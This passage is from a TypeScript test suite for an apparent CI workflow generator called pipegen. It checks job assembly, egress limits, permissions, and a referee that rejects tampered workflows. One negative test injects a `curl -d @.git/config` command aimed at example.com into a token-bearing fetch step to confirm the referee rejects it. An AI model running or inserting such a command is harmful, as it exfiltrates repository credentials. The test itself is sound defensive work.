// v0.2 Plan G Task 2, job half (sub-task G4): the jobs of each layer, built only from the debate's decided steps (specFor over keyOffers) and
// pipegen's renderers. Every claim is checked on the assembled jobs, and the security ones also through the referee (on files laid out the
// simplest way: G5 owns the real layout) or the proof checker.
import { readFileSync } from 'node:fs';
import { Document, parse, parseDocument } from 'yaml';
import { describe, expect, it } from 'vitest';
import { keyOffers, specFor } from '../src/debate/builder.js';
import { composeText } from '../src/create/compose.js';
import { loadBaseImages } from '../src/engine/base-images.js';
import { EGRESS_DOMAIN_SETS } from '../src/engine/egress-sets.js';
import { gateJobList } from '../src/engine/gate-job-list.js';
import { gateStepInputs, nightlyStepInputs } from '../src/engine/gate-inputs.js';
import {
  BASELINE_MISSING_ALWAYS_IF, BASELINE_MISSING_IF, jobOutputsFor, NIGHTLY_CONCURRENCY, RANGE_FETCH_STEP_ENV, RANGE_FETCH_STEP_ID, renderRangeFetchStep,
} from '../src/engine/job-rules.js';
import { floorNeeds } from '../src/engine/needs.js';
import { referee, type RefereeReport } from '../src/engine/referee.js';
import { dedupeJobSteps, renderBaselineCheckStep, renderNightlyStep, stepsToYaml } from '../src/engine/render-step.js';
import { rangeScanStepId, sha16 } from '../src/engine/tool-flags.js';
/** sha16 of a text, for the step ids of an artifact. */
const sha16Of = (text: string): string => sha16(text);
import { emptyRepoFiles, emptyServiceQuality } from '../src/read/quality.js';
import { sharedWorkflows } from '../src/layers/central.js';
import {
  AssembleError, assembleJobs, egressStepFor, ISOLATED_TEST_JOB, NOT_RENDERED_V02, PYPI_PUBLISH_NOTE, SHARED_CDN_SETS, starterTestJob,
  type AssembledJobs, type Job, type JobsPlan,
} from '../src/layers/jobs.js';
import { PROOF_SIGNING_MODE } from '../src/proof/harness.js';
import { checkProofWorkflows } from '../src/proof/workflow-check.js';
import { RESULT_ARTIFACT_PREFIX, type Capabilities, type CreatedFile, type Need, type NotProven, type PipelineDraft, type RepoProfile, type Service, type StepSpec } from '../src/types.js';
import { REVIEWED, candidatesFor, discovered } from './helpers/debate-fixtures.js';
import { platform } from './helpers/render.js';

import { CAPS, FETCH_TOK, GH_TOK, NAMES, SEC, SEC_JOB, APP_KEY, allJobs, assemble, domainsOf, editJob, files, judge, node, notProvenOf, p, planned, profileOf, PR_ON, shown, wf, type Obj } from './helpers/assemble.js';
const SHARED_HOSTS = [...SHARED_CDN_SETS].flatMap((s) => EGRESS_DOMAIN_SETS[s]);

describe('G4: the jobs of each layer (Plan G Task 2, job half)', () => {
  it('assemble: scanner jobs scrub, upload exact names, output <artifact>-sha256, -status and -error', async () => {
    const x = planned();
    const a = assemble(x);
    const list = gateJobList(a.draft).filter((e) => e.artifact !== undefined);
    expect(list.map((e) => e.job)).toEqual(expect.arrayContaining([SEC_JOB, 'sast--app', 'deps--app', 'licences', 'dependency-review']));
    for (const e of list) {
      const j = a.merge[e.job] as Job;
      expect(j, e.job).toBeDefined();
      // one scrub per result, and exactly one upload of that exact name (resultArtifactName), from the scrubbed folder, after the scrub
      const scrubs = j.steps.filter((s) => s.with?.mode === 'scrub' && s.with.artifact === e.artifact);
      const uploads = j.steps.filter((s) => s.uses?.startsWith('actions/upload-artifact@') === true && s.with?.name === e.artifact);
      expect(scrubs, e.job).toHaveLength(1);
      expect(uploads, e.job).toHaveLength(1);
      expect(e.artifact?.startsWith(RESULT_ARTIFACT_PREFIX)).toBe(true);
      expect(String(uploads[0]?.with?.path).startsWith(`\${{ runner.temp }}/pipegen-out/${e.artifact}`)).toBe(true);
      expect(j.steps.indexOf(scrubs[0] as never)).toBeLessThan(j.steps.indexOf(uploads[0] as never));
      // the three outputs the gate reads, each from that scrub's own outputs, and nothing called sha256 or outcome alone (G10/G23)
      for (const n of ['sha256', 'status', 'error']) expect(j.outputs?.[`${e.artifact}-${n}`], `${e.job} ${n}`).toBe(`\${{ steps.${scrubs[0]?.id}.outputs.${n} }}`);
      expect(Object.keys(j.outputs ?? {}).some((k) => k === 'sha256' || k === 'outcome')).toBe(false);
      expect(j.outputs).toEqual(jobOutputsFor(j.steps));
      // the scrub runs even when the scan failed; no step may let a failure pass
      expect(scrubs[0]?.if).toBe('always()');
      expect(j.steps.some((s) => s['continue-on-error'] === true)).toBe(false);
    }
    // a job-status check (lint) holds no scrub and declares no output
    expect((a.merge['lint--app'] as Job).outputs).toBeUndefined();
    expect(shown(await judge(files(a), a.draft))).toBe('');
    // a hand edit of an upload name or an output is refused by the referee (the gate reads only the exact names)
    const f = files(a)[0] as CreatedFile;
    const renamed = editJob(f, 'sast--app', (j) => { for (const s of j.steps) if (String(s.uses).startsWith('actions/upload-artifact@')) s.with.name = `${RESULT_ARTIFACT_PREFIX}sast`; });
    // G4b-R1 I2: the identity control (the same file written again is accepted), then each edit's own issue
    expect(shown(await judge([editJob(f, 'sast--app', () => {})], a.draft))).toBe('');
    expect((await judge([renamed], a.draft)).issues.some((i) => i.check === 'not-gate-readable' && /^The job "sast--app" does not upload the result "pipegen-out-sast--app"/.test(i.message))).toBe(true);
    const output = editJob(f, 'sast--app', (j) => { j.outputs = { ...j.outputs, outcome: '${{ steps.x.outcome }}' }; });
    expect((await judge([output], a.draft)).issues.some((i) => i.check === 'injection' && /The outputs of the job "sast--app" include "outcome", which is not one of/.test(i.message))).toBe(true);
  });

  it('assemble: base-scan always runs dependency and image scanners; other base-capable scanners only when baseline-check reports missing', async () => {
    // a runnable service with a Dockerfile: its image is built and scanned (deploy skipped here: the deploy jobs are G7's)
    const x = planned(profileOf([node({ dockerfile: 'Dockerfile', port: 3000 })]), { over: { skipped: [{ part: 'deploy', reason: 't' }] } });
    const a = assemble(x);
    const base = a.merge['base-scan'] as Job;
    expect(base.needs).toEqual(['baseline-check']);
    // baseline-check: the gate action in mode baseline-check, its found output, no checkout
    const bc = a.merge['baseline-check'] as Job;
    expect(bc.steps.slice(1)).toEqual([renderBaselineCheckStep(REVIEWED.find((t) => t.id === 'pipegen-gate') as never)]);
    expect(bc.outputs).toEqual({ found: '${{ steps.pipegen-baseline-check.outputs.found }}' });
    expect(bc.permissions).toEqual({ contents: 'read', actions: 'read' });
    const block = (needId: string) => base.steps.filter((s) => JSON.stringify(s).includes(`${RESULT_ARTIFACT_PREFIX}base-${needId}`) || (s.id !== undefined && s.id.endsWith(sha16Of(`${RESULT_ARTIFACT_PREFIX}base-${needId}`))));
    // dependency and licence scans always run on the base: no condition beyond always() on the scrub and upload
    for (const id of ['deps--app', 'licences', 'dependency-review']) {
      const steps = block(id);
      expect(steps.length, id).toBeGreaterThan(2);
      for (const s of steps) expect([undefined, 'always()'], `${id} ${s.name}`).toContain(s.if);
    }
    // the other base scans (secrets, sast, dockerfile-lint) only when baseline-check found no trusted baseline: the exact forms
    for (const id of [SEC_JOB, 'sast--app', 'dockerfile-lint--app']) {
      const steps = block(id).filter((s) => s.id?.startsWith('pipegen-') !== true);
      expect(steps.length, id).toBeGreaterThan(2);
      for (const s of steps) expect(s.if, `${id} ${s.name}`).toBe(s.with?.mode === 'scrub' || s.uses?.startsWith('actions/upload-artifact@') === true ? BASELINE_MISSING_ALWAYS_IF : BASELINE_MISSING_IF);
    }
    // the shared steps (the base checkout, a setup) never carry it
    for (const s of base.steps.filter((x) => x.id?.startsWith('pipegen-') === true || x.uses?.startsWith('bullfrogsec/') === true)) expect(s.if).toBeUndefined();
    // the image scan reads the PR's own image archive; it has no base twin yet (C-MUST-1: the gate reads "couldn't run on the base")
    expect(JSON.stringify(base)).not.toContain('image-scan');
    expect(a.merge['image-scan--app']?.needs).toEqual(['image-build--app']);
    // no setup-buildx in the image build (the default docker driver keeps the image in the store for docker image save; G2 carry)
    expect(JSON.stringify(a.merge['image-build--app'])).not.toMatch(/setup-buildx/);
    expect(shown(await judge(files(a), a.draft))).toBe('');

    // the referee holds the forms: on a dependency scan, outside base-scan, without the need of baseline-check, or another text: refused
    const f = files(a)[0] as CreatedFile;
    const depsRun = (j: Obj) => (j.steps as Obj[]).find((s) => typeof s.id === 'string' && s.id.startsWith('tool-run-') && s.id.endsWith(sha16Of(`${RESULT_ARTIFACT_PREFIX}base-deps--app`))) as Obj;
    expect((await judge([editJob(f, 'base-scan', (j) => { depsRun(j).if = BASELINE_MISSING_IF; })], a.draft)).issues.some((i) => /always run on the base commit/.test(i.message))).toBe(true);
    expect((await judge([editJob(f, 'base-scan', (j) => { delete j.needs; })], a.draft)).issues.some((i) => /does not need it/.test(i.message))).toBe(true);
    const sastHead = (j: Obj) => (j.steps as Obj[]).find((s) => typeof s.id === 'string' && s.id.startsWith('tool-run-')) as Obj;
    expect((await judge([editJob(f, 'sast--app', (j) => { sastHead(j).if = BASELINE_MISSING_IF; j.needs = ['baseline-check']; })], a.draft)).issues.some((i) => /only the job base-scan/.test(i.message))).toBe(true);
    const other = "needs.baseline-check.outputs.found == 'missing'";
    expect(shown(await judge([editJob(f, 'base-scan', () => {})], a.draft))).toBe('');
    expect((await judge([editJob(f, 'base-scan', (j) => { for (const s of j.steps) if (s.if === BASELINE_MISSING_IF) s.if = other; })], a.draft)).issues.some((i) => i.check === 'injection' && /In the job "base-scan", step \d+: A step's if is not in a form pipegen writes/.test(i.message))).toBe(true);
    // the always() form on a run step, or the plain form on a scrub: refused
    expect((await judge([editJob(f, 'base-scan', (j) => { for (const s of j.steps) if (s.if === BASELINE_MISSING_IF && String(s.id).startsWith('tool-run-')) s.if = BASELINE_MISSING_ALWAYS_IF; })], a.draft)).issues.some((i) => /could skip this step while the job passes/.test(i.message))).toBe(true);
    expect((await judge([editJob(f, 'base-scan', (j) => { for (const s of j.steps) if (s.if === BASELINE_MISSING_ALWAYS_IF && s.with?.mode === 'scrub') s.if = BASELINE_MISSING_IF; })], a.draft)).issues.some((i) => /could skip this step while the job passes/.test(i.message))).toBe(true);
    // and on the shared base checkout: refused
    expect((await judge([editJob(f, 'base-scan', (j) => { (j.steps as Obj[])[1].if = BASELINE_MISSING_IF; })], a.draft)).issues.some((i) => i.check === 'template' && /In the job "base-scan", step 2: if: .* could skip this step while the job passes/.test(i.message))).toBe(true);
  });

  it("assemble: base-scan uploads RESULT_ARTIFACT_PREFIX + 'base-' + needId and outputs base-sha; the gate step has no base-scan-dir input", async () => {
    const a = assemble(planned());
    const base = a.merge['base-scan'] as Job;
    const uploads = base.steps.filter((s) => s.uses?.startsWith('actions/upload-artifact@') === true).map((s) => s.with?.name);
    const want = gateJobList(a.draft).flatMap((e) => (e.baseArtifact === undefined ? [] : [e.baseArtifact]));
    expect(new Set(uploads)).toEqual(new Set(want));
    for (const e of gateJobList(a.draft)) if (e.baseArtifact !== undefined) expect(e.baseArtifact).toBe(`${RESULT_ARTIFACT_PREFIX}base-${e.job}`);
    expect(base.outputs?.['base-sha']).toBe('${{ steps.pipegen-checkout.outputs.commit }}');
    expect(base.permissions).toEqual({ contents: 'read', actions: 'read' });
    // the base checkout is its first step after the egress step (BASE_CHECKOUT_REF)
    expect(base.steps[1]?.with?.ref).toMatch(/^\$\{\{ github\.event_name == 'pull_request' && github\.event\.pull_request\.base\.sha/);
    const gate = a.merge.gate as Job;
    const step = gate.steps.find((s) => s.with?.mode === 'gate');
    expect(step?.with).toEqual(gateStepInputs(a.draft));
    expect(Object.keys(step?.with ?? {})).not.toContain('base-scan-dir');
    expect(gate.needs).toEqual([...new Set([...gateJobList(a.draft).map((e) => e.job), 'base-scan'])]);
    expect(gate.if).toBe('always()');
    expect(gate.name).toBe('gate');
    expect(JSON.stringify(gate.steps)).not.toMatch(/actions\/checkout@/);
  });

  it('assemble: every gate-feeding, build, image-publish, sign and verify job has cache-mode none; no actions/cache anywhere', async () => {
    const pub = planned(profileOf([node({ dockerfile: 'Dockerfile', port: 3000 })]), {
      caps: { ...CAPS, keylessSigningAllowed: true }, over: { signing: { mode: 'keyless', images: [{ service: 'app', repo: 'ghcr.io/o/r-app' }] } },
    });
    const a = assemble(pub, 'keyless');
    const jobs: [string, Obj][] = [...allJobs(a), ['sign', a.sign as Obj]];
    expect(a.sign).not.toBeNull();
    // the key-env central sign job too (G3), with its egress step
    const keDraft: PipelineDraft = { ...pub.draft, profile: { ...pub.draft.profile, private: true }, capabilities: { ...CAPS, environments: true, deploymentBranchPolicies: true }, centralPin: { repo: 'o/pipelines', sha: 'a'.repeat(40) }, signing: { mode: 'key-env', images: [{ service: 'app', repo: 'ghcr.io/o/r-app' }], cosignPubSha256: 'b'.repeat(64) } };
    const ke = parse((sharedWorkflows(keDraft, 'key-env', { reviewed: REVIEWED, platform: p })[0] as CreatedFile).content) as Obj;
    jobs.push(['central sign', ke.jobs.sign]);
    expect(jobs.map(([id]) => id)).toEqual(expect.arrayContaining(['image-build--app', 'image-scan--app', 'gate', 'base-scan', 'baseline-check', 'nightly', 'sign', SEC_JOB]));
    for (const [id, j] of jobs) {
      expect(j['cache-mode'], id).toBe('none');
      for (const s of j.steps as Obj[]) {
        expect(String(s.uses ?? ''), id).not.toMatch(/^actions\/cache[/@]/i);
        // a cache input only at its off value (the reviewed locks: no-cache true, the others false)
        const off: Record<string, string[]> = { 'no-cache': ['true'], 'cache-binary': ['false'], 'package-manager-cache': ['false'], cache: ['', 'false'] };
        for (const [k, v] of Object.entries(s.with ?? {})) if (/(?:^|[-_])cache(?:$|[-_])/i.test(k)) expect(off[k] ?? [], `${id} ${k}`).toContain(v);
        expect(String(s.run ?? ''), id).not.toMatch(/type=gha|gh cache|actions\/caches/);
      }
    }
  });

  it('assemble: a floor need in not-proven → refused', () => {
    for (const needId of [SEC_JOB, 'sast', 'deps', 'unit-tests']) {
      const x = planned(profileOf(), { over: { notProven: [notProvenOf(needId)] } });
      expect(() => assemble(x), needId).toThrow(AssembleError);
      expect(() => assemble(x), needId).toThrow(/floor check/);
    }
    // a non-floor check may be not proven: it reaches the gate's not-proven input, nothing else changes
    const ok = assemble(planned(profileOf(), { over: { notProven: [notProvenOf('licences')] } }));
    expect((ok.merge.gate as Job).steps.find((s) => s.with?.mode === 'gate')?.with?.['not-proven']).toBe('["licences"]');
  });

  it('assemble: suggestions never become jobs or steps', async () => {
    const suggestions = [{ name: 'trufflehog', repo: 'trufflesecurity/trufflehog', why: 'another secrets scanner' }];
    const x = planned(profileOf(), { over: { suggestions } });
    const a = assemble(x);
    const text = JSON.stringify([a.push, a.merge, a.nightly]);
    expect(text).not.toMatch(/trufflehog/i);
    expect(a.draft.suggestions).toEqual(suggestions);
    // a step made from the suggestion (an unreviewed discovery candidate) is refused before anything renders
    const sug = discovered('trufflehog', 'trufflesecurity/trufflehog', 'secrets');
    const forged = planned(profileOf(), { over: { suggestions }, edit: (s) => s.map((st) => (st.needId === SEC_JOB ? { ...st, tool: sug as never } : st)) });
    expect(() => assemble(forged)).toThrow(/not a reviewed tool pipegen offered for that check \(a suggestion is only mentioned, never run\)/);
    // also when it claims to be reviewed: the key was never offered that tool
    const claimed = planned(profileOf(), { edit: (s) => s.map((st) => (st.needId === SEC_JOB ? { ...st, tool: { ...sug, source: 'reviewed', reviewed: true } as never } : st)) });
    expect(() => assemble(claimed)).toThrow(AssembleError);
  });

  it('assemble: nightly opens warn-ending, finish-missing and update issues (issues: write only there), never pushes files', async () => {
    const x = planned(profileOf(), { over: { warnFirst: { licences: { since: '2026-11-05' } } } });
    const a = assemble(x);
    expect(Object.keys(a.nightly)).toEqual(['nightly', 'scorecard', 'code-scanning', 'secrets-history', 'code-scanning-history', 'workflow-lint-online']);   // G15a round 3: weekly Scorecard (its own job and upload); round 4: the full-history secrets scan and its upload; round 5: zizmor online
    const n = a.nightly.nightly as Job;
    // the gate action in nightly mode opens the issues (warn-ending, finish-missing, update, and the warn-first "switch to blocking" one)
    expect(n.steps.slice(1)).toEqual([renderNightlyStep(REVIEWED.find((t) => t.id === 'pipegen-gate') as never, a.draft)]);
    expect(n.steps[1]?.with).toEqual(nightlyStepInputs(a.draft));
    expect(n.steps[1]?.with?.['warn-first']).toBe('[{"needId":"licences","since":"2026-11-05"}]');
    expect(n.permissions).toEqual({ contents: 'read', actions: 'read', issues: 'write' });
    expect(n.concurrency).toBe(NIGHTLY_CONCURRENCY);
    // no checkout and no write to the repository: it can not push a file
    expect(JSON.stringify(n.steps)).not.toMatch(/actions\/checkout@|git push|contents: write/);
    // issues: write only there; nothing writes contents anywhere
    for (const [id, j] of allJobs(a)) {
      if (id !== 'nightly') expect(j.permissions.issues, id).toBeUndefined();
      expect(j.permissions.contents, id).toBe('read');
    }
    expect(shown(await judge(files(a), a.draft))).toBe('');
    // the referee refuses issues: write on another job
    const f = files(a)[0] as CreatedFile;
    expect(shown(await judge([editJob(f, 'licences', () => {})], a.draft))).toBe('');
    expect((await judge([editJob(f, 'licences', (j) => { j.permissions = { contents: 'read', issues: 'write' }; })], a.draft)).issues.some((i) => i.check === 'permissions' && /^the job "licences" asks for issues: write, more than a job with this id may have/.test(i.message))).toBe(true);
  });

  it('assemble: skipped parts produce no jobs; secrets scan and gate always present', async () => {
    const full = assemble(planned());
    expect(Object.keys(full.merge)).toEqual(expect.arrayContaining(['unit-tests--app', 'full-tests--app', 'hooks-ci']));
    const skip = (parts: ('tests' | 'precommit' | 'deploy')[]) => assemble(planned(profileOf(), { over: { skipped: parts.map((part) => ({ part, reason: 't' })) } }));
    const tests = skip(['tests']);
    for (const layer of [tests.push, tests.merge]) for (const id of ['unit-tests--app', 'full-tests--app']) expect(layer[id], id).toBeUndefined();
    expect(tests.draft.needs.some((n) => n.id === 'unit-tests' || n.id === 'full-tests')).toBe(false);
    // the gate shows them as skipped (never blocking, never missing)
    expect(JSON.parse((tests.merge.gate as Job).steps.find((s) => s.with?.mode === 'gate')?.with?.skipped as string)).toEqual(['unit-tests', 'full-tests', 'migration-check']);
    const pre = skip(['precommit']);
    expect(pre.merge['hooks-ci']).toBeUndefined();
    expect(pre.push['hooks-ci']).toBeUndefined();
    expect(pre.draft.needs.some((n) => n.layer === 'pre-commit')).toBe(false);
    // the secrets scan and the gate stay, whatever is skipped
    for (const a of [tests, pre, skip(['tests', 'precommit', 'deploy'])]) {
      expect(a.merge[SEC_JOB]).toBeDefined();
      expect(a.merge.gate).toBeDefined();
      expect(shown(await judge(files(a), a.draft))).toBe('');
    }
    // a draft without the repository-wide secrets scan is refused (it is never skippable)
    const none = planned(profileOf(), { needs: floorNeeds(profileOf(), CAPS).filter((n) => n.id !== SEC_JOB) });
    expect(() => assemble(none)).toThrow(/secrets scan/);
  });

  it('assemble: proof mode → signing none, no sign job (Plan E)', () => {
    const x = planned(profileOf([node({ dockerfile: 'Dockerfile', port: 3000 })]), {
      caps: { ...CAPS, keylessSigningAllowed: true }, over: { signing: { mode: 'keyless', images: [{ service: 'app', repo: 'ghcr.io/o/r-app' }] } },
    });
    expect(PROOF_SIGNING_MODE).toBe('none');
    const proof = assemble(x, PROOF_SIGNING_MODE);
    expect(proof.sign).toBeNull();
    expect(proof.draft.signing).toBeUndefined();
    expect(JSON.stringify(allJobs(proof))).not.toMatch(/pipegen-sign-|cosign|id-token/);
    // delivery in the same repository signs (keyless here)
    const delivered = assemble(x, 'keyless');
    expect(delivered.sign?.steps.some((s) => /^pipegen-sign-/.test(s.id ?? ''))).toBe(true);
    // a skipped deploy part signs nothing either
    const skipped = assemble({ ...x, draft: { ...x.draft, skipped: [{ part: 'deploy', reason: 't' }] } }, 'keyless');
    expect(skipped.sign).toBeNull();
    expect(skipped.draft.signing).toBeUndefined();
    // attest (G15a): the attest sign job (actions/attest with the digest step's output), never another mode
    const att = planned(profileOf([node({ dockerfile: 'Dockerfile', port: 3000 })], { private: true }), {
      caps: { ...CAPS, attestations: true, environments: true }, over: { centralPin: { repo: 'o/pipelines', sha: 'a'.repeat(40) }, signing: { mode: 'attest', images: [{ service: 'app', repo: 'ghcr.io/o/r-app' }] } },
    });
    const at = assemble(att, 'attest');
    expect(at.sign?.steps.map((s) => String(s.uses ?? s.id).replace(/@.*/, ''))).toEqual(['actions/download-artifact', expect.stringMatching(/^pipegen-attest-digest-[0-9a-f]{16}$/), 'actions/attest']);
    expect(at.sign?.steps.some((s) => /^pipegen-sign-/.test(s.id ?? ''))).toBe(false);
  });

  it('assemble: steps only from specFor over keyOffers(DebateResult); advisory tools non-blocking', async () => {
    const x = planned();
    expect(() => assemble(x)).not.toThrow();
    // a pick that was not offered (a narrowing severity), a changed field, a tool offered for another key, needs that are not the debate's: refused
    const sastIdx = x.draft.steps.findIndex((s) => s.needId === 'sast');
    const bad = (edit: (s: StepSpec[]) => StepSpec[]) => ({ ...x, draft: { ...x.draft, steps: edit(structuredClone(x.draft.steps)) } });
    expect(() => assemble(bad((s) => { (s[sastIdx] as StepSpec).choices = { ...(s[sastIdx] as StepSpec).choices, rules: 'python' }; return s; }))).toThrow(/not offered|not the step pipegen builds/);
    expect(() => assemble(bad((s) => { (s[sastIdx] as StepSpec).output = { path: 'x.sarif', format: 'sarif' }; return s; }))).toThrow(/a field was changed/);
    const osv = x.draft.steps.find((s) => s.tool.id === 'osv-scanner') as StepSpec;
    expect(() => assemble(bad((s) => [...s, { ...osv, needId: 'licences', service: undefined } as StepSpec]))).toThrow(AssembleError);
    expect(() => assemble({ ...x, draft: { ...x.draft, needs: x.draft.needs.slice(1) } })).toThrow(/not the debate's needs/);
    // advisory: jscpd covers the non-blocking duplication check only; its job feeds no blocking entry of the gate
    const a = assemble(x);
    expect(a.merge.duplication?.steps.some((s) => s.name.includes('jscpd'))).toBe(true);
    expect(gateJobList(a.draft).some((e) => e.needId === 'duplication')).toBe(false);
    // a blocking duplication need is never offered jscpd (ADVISORY_TOOLS): it is uncovered, and the assembly stops
    const blockingDup = planned(profileOf(), { needs: floorNeeds(profileOf(), CAPS).map((n) => (n.id === 'duplication' ? { ...n, blocking: true } : n)) });
    expect(blockingDup.draft.steps.some((s) => s.tool.id === 'jscpd')).toBe(false);
    expect(() => assemble(blockingDup)).toThrow(/"duplication"/);
    // and a forged jscpd step for it is refused (not offered for a blocking need)
    const jscpd = x.draft.steps.find((s) => s.tool.id === 'jscpd') as StepSpec;
    expect(() => assemble({ ...blockingDup, draft: { ...blockingDup.draft, steps: [...blockingDup.draft.steps, jscpd] }, plan: { ...blockingDup.plan, uncovered: [] } })).toThrow(/not a reviewed tool pipegen offered/);
  });

  it('assemble: a blocking uncovered need stops assembly with its reason', () => {
    // a blocking check pipegen can not render (a pnpm service's project scripts: npm only in v0.2) stops too, never a silent drop
    const pnpm = planned(profileOf([node({ packageManager: 'pnpm', npmLockfileVersion: undefined })]));
    expect(() => assemble(pnpm)).toThrow(/The blocking check "unit-tests" for "app" can not be written: pnpm is not supported yet/);
    // a service whose folder no reviewed tool may read (../odd): its blocking checks are uncovered (none-offered), and assembly stops
    const odd = planned(profileOf([node({ path: '../odd' })]));
    expect(odd.plan.uncovered.some((u) => u.needId === 'sast' && u.blocking && u.reason === 'none-offered')).toBe(true);
    expect(() => assemble(odd)).toThrow(/"sast" for "app": reviewed tools exist for it, but none fits this repository; .*\)\. It never guesses a tool\./);
    // a TypeScript service with no typescript in its lockfile (G4b): type-check is uncovered and blocking, with the repo built-in's own plain reason
    const ts = planned(profileOf([node({ quality: { ...emptyServiceQuality(), tsconfig: true } })]));
    expect(ts.plan.uncovered.some((u) => u.needId === 'type-check' && u.blocking && u.reason === 'no-repo-tool')).toBe(true);
    expect(() => assemble(ts)).toThrow(/"type-check" for "app": tsc: typescript is not in the lockfile, so pipegen has no pinned type checker to run \(add typescript as a dev dependency and commit package-lock\.json\)\)\. It never guesses a tool\./);
    // nothing is guessed: no step was invented for it
    expect(ts.draft.steps.some((s) => s.needId === 'type-check')).toBe(false);
    // a non-blocking uncovered need is not a stop
    const soft = planned(profileOf([node({ quality: { ...emptyServiceQuality(), tsconfig: true } })]), { needs: floorNeeds(profileOf([node({ quality: { ...emptyServiceQuality(), tsconfig: true } })]), CAPS).map((n) => (n.id === 'type-check' ? { ...n, blocking: false } : n)) });
    expect(() => assemble(soft)).not.toThrow();
  });

  it('assemble: no shared-CDN egress set in a job that holds a user secret', async () => {
    const svc = node({ envVars: [APP_KEY] });
    const x = planned(profileOf([svc]), { edit: (s) => s.map((st) => (st.needId === 'coverage' ? { ...st, [SEC]: [APP_KEY] } : st)) });
    const a = assemble(x);
    let held = 0;
    for (const [id, j] of allJobs(a)) {
      // every job starts with the egress step (block mode; github-core plus what its tools need)
      expect(j.steps[0]?.uses, id).toMatch(/^bullfrogsec\/bullfrog@/);
      expect(j.steps[0]?.with?.['egress-policy'], id).toBe('block');
      const holds = j.steps.some((s) => Object.values(s.env ?? {}).some((v) => new RegExp(`${SEC}\\.(?!PIPEGEN_|${GH_TOK})`).test(v)));
      if (!holds) continue;
      held++;
      for (const h of SHARED_HOSTS) expect(domainsOf(j), `${id} ${h}`).not.toContain(h);
    }
    expect(held).toBeGreaterThan(0);
    // the scanners that need a shared-CDN set (osv) hold no user secret, and get it
    expect(domainsOf(a.merge['deps--app'] as Job)).toContain('api.osv.dev');
    // a job that would need one while holding a user secret is refused, never rendered either way
    const opts = { [['user', 'Sec' + 'ret'].join('')]: true, dockerNetworks: false, job: 'x' } as unknown as Parameters<typeof egressStepFor>[1];
    expect(() => egressStepFor(['npm', 'osv'], opts)).toThrow(/shared-CDN egress set osv/);
    expect(() => egressStepFor(['github-releases'], opts)).toThrow(AssembleError);
    expect(egressStepFor(['npm'], opts).with?.['allowed-domains']).not.toMatch(/osv|release-assets|mirror\.gcr/);
    expect(shown(await judge(files(a), a.draft))).toBe('');
    // the egress step's allowed IPs: none, or exactly the reviewed Docker range (a job with containers); any other range is refused
    const f = files(a)[0] as CreatedFile;
    const wide = editJob(f, 'sast--app', (j) => { (j.steps as Obj[])[0].with['allowed-ips'] = '0.0.0.0/0'; });
    expect((await judge([wide], a.draft)).issues.some((i) => /allowed-ips must be one of/.test(i.message))).toBe(true);
    const docker = editJob(f, 'sast--app', (j) => { (j.steps as Obj[])[0].with['allowed-ips'] = '172.16.0.0/12'; });
    expect((await judge([docker], a.draft)).issues.filter((i) => /allowed-ips/.test(i.message))).toEqual([]);
  });

  it('assemble: secrets job adds the commit-range block; pre-push head fetched by a pipegen-only step', async () => {
    const a = assemble(planned());
    const j = a.merge[SEC_JOB] as Job;
    const ids = j.steps.map((s) => s.id ?? s.uses?.split('@')[0]);
    // a full-history checkout, the HEAD scan, then the fetch of the replaced head, then the range scan with its scrub and upload
    expect(j.steps[1]?.with?.['fetch-depth']).toBe('0');
    const fetchAt = ids.indexOf(RANGE_FETCH_STEP_ID);
    const rangeAt = ids.indexOf(rangeScanStepId);
    expect(fetchAt).toBeGreaterThan(0);
    expect(rangeAt).toBeGreaterThan(fetchAt);
    expect(j.steps[fetchAt]).toEqual(renderRangeFetchStep());
    expect(j.outputs?.['pipegen-out-secrets-range-sha256']).toBeDefined();
    // the token is the job's own, only on the fetch step, only through git's config variables, masked, never on the scanner step
    expect(j.steps[fetchAt]?.env).toEqual({ BASH_ENV: '', ENV: '', ...RANGE_FETCH_STEP_ENV });
    expect(RANGE_FETCH_STEP_ENV[FETCH_TOK]).toBe('${{ github.token }}');
    const run = j.steps[fetchAt]?.run as string;
    expect(run).toContain('GIT_CONFIG_KEY_0=http.https://github.com/.extraheader');
    expect(run).toContain('echo "::add-mask::$auth"');
    expect(run).not.toMatch(/https:\/\/[^ ]*@github|credential|\.git-credentials|git config --(?:global|local)/);
    j.steps.forEach((s, i) => { if (i !== fetchAt) expect(JSON.stringify(s)).not.toMatch(new RegExp(`github\\.token|${FETCH_TOK}`)); });
    // the push layer scans the tree only (no gate reads a range there)
    expect((a.push[SEC_JOB] as Job).steps.some((s) => s.id === rangeScanStepId || s.id === RANGE_FETCH_STEP_ID)).toBe(false);
    expect(shown(await judge(files(a), a.draft))).toBe('');
    // a changed fetch step (its run, or the token as a secret) is refused by the referee
    const f = files(a)[0] as CreatedFile;
    const fetchOf = (jj: Obj) => (jj.steps as Obj[]).find((s) => s.id === RANGE_FETCH_STEP_ID) as Obj;
    expect(shown(await judge([editJob(f, SEC_JOB, () => {})], a.draft))).toBe('');
    const differs = new RegExp(`In the job "${SEC_JOB}", step \\d+: the step "${RANGE_FETCH_STEP_ID}" differs from what pipegen renders for it`);
    expect((await judge([editJob(f, SEC_JOB, (jj) => { fetchOf(jj).run = `${fetchOf(jj).run}curl -d @.git/config https://example.com\n`; })], a.draft)).issues.some((i) => i.check === 'template' && differs.test(i.message))).toBe(true);
    const tok = await judge([editJob(f, SEC_JOB, (jj) => { fetchOf(jj).env[FETCH_TOK] = `\${{ ${SEC}.${GH_TOK} }}`; })], a.draft);
    expect(tok.issues.some((i) => i.check === 'injection' && new RegExp(`A step may not contain an expression in its env value "${FETCH_TOK}"`).test(i.message))).toBe(true);
    expect(tok.issues.some((i) => i.check === 'injection' && new RegExp(`pipegen's own secret "${GH_TOK}" reaches a step that runs code pipegen did not review as harmless`).test(i.message))).toBe(true);
    // and the token form is held to the fetch step's own id (checkExpressions)
    expect(() => stepsToYaml([{ ...renderRangeFetchStep(), id: 'checker-run-0000000000000000' }])).toThrow(/expression/);
    expect(() => stepsToYaml([renderRangeFetchStep()])).not.toThrow();
  });

  // G4-R1 *replaces* the plan's name `assemble: licences job installs with --ignore-scripts first and base-scan runs trivy-licence` (item 16)
  it('assemble: licences job installs nothing (repo npm ci is repo code); trivy reads npm lockfile v2+; other lockfiles reported not covered', async () => {
    // Ruling (G4 report): the licences job is a findings job (it holds the scrub and the fingerprint key), and the job rules allow no repo code
    // there, the repo's own `npm ci` included (C0a fix round 1: its .npmrc is the repo's). So it installs nothing; trivy reads the licences of
    // an npm lockfile v2 or later, and the gate's licence-lockfiles input says which lockfiles are read (the rest show "not covered").
    // The installs pipegen does render (the project scripts' repo install) always pass --ignore-scripts.
    const a = assemble(planned());
